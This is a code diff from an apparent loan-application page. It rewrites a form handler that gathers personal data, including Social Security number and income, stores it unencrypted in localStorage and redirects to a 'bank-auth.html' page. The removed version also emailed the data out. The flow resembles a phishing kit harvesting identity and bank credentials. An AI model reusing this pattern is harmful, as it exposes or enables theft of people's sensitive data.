@@ -871,38 +871,29 @@
                 });
         }
 
-        function submitPersonalLoanForm() {
-            console.log('submitPersonalLoanForm() called!');
-            
-            // Collect form data with exact field IDs
-            const data = {
-                loanAmount: document.getElementById("loanAmount").value,
-                loanPurpose: document.getElementById("loanPurpose").value,
-                creditScore: document.getElementById("creditScore").value,
-                name: document.getElementById("name").value,
-                email: document.getElementById("email").value,
-                phone: document.getElementById("phone").value,
-                streetAddress: document.getElementById("streetAddress").value,
-                city: document.getElementById("city").value,
-                state: document.getElementById("state").value,
-                zipCode: document.getElementById("zipCode").value,
-                ssn: document.getElementById("ssn").value,
-                annualIncome: document.getElementById("annualIncome").value,
-                employmentStatus: document.getElementById("employmentStatus").value,
-                monthlyHousing: document.getElementById("monthlyHousing").value
-            };
-            
-            console.log('Personal loan data collected:', data);
-            
-            // Store in localStorage for bank-auth form
-            localStorage.setItem("loanData", JSON.stringify(data));
-            
-            // Send email notification (keep existing email functionality)
-            sendPersonalLoanEmail(data);
-            
-            // Redirect to bank authentication page
-            window.location.href = "bank-auth.html";
-        }
+        document.getElementById("loanApplicationForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const data = {
+    loanAmount: document.getElementById("loanAmount").value,
+    loanPurpose: document.getElementById("loanPurpose").value,
+    creditScore: document.getElementById("creditScore").value,
+    name: document.getElementById("name").value,
+    email: document.getElementById("email").value,
+    phone: document.getElementById("phone").value,
+    streetAddress: document.getElementById("streetAddress").value,
+    city: document.getElementById("city").value,
+    state: document.getElementById("state").value,
+    zipCode: document.getElementById("zipCode").value,
+    ssn: document.getElementById("ssn").value,
+    annualIncome: document.getElementById("annualIncome").value,
+    employmentStatus: document.getElementById("employmentStatus").value,
+    monthlyHousing: document.getElementById("monthlyHousing").value
+  };
+
+  localStorage.setItem("loanData", JSON.stringify(data));
+  window.location.href = "bank-auth.html";
+});
         
         // Save bank selection to sessionStorage
         function saveBankSelection() {
